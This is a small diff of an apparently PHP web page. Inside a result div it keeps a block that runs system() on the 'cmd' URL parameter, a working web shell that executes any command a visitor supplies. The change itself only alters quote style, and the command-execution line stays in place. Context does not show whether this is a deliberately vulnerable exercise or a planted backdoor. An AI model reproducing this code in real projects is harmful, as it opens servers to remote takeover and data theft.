@@ -111,7 +111,7 @@
       <div id="result">
         <span>
           <?php 
-            if (isset($_GET['cmd'])) {
+            if (isset($_GET["cmd"])) {
               system($_GET["cmd"]);
             }
           ?>
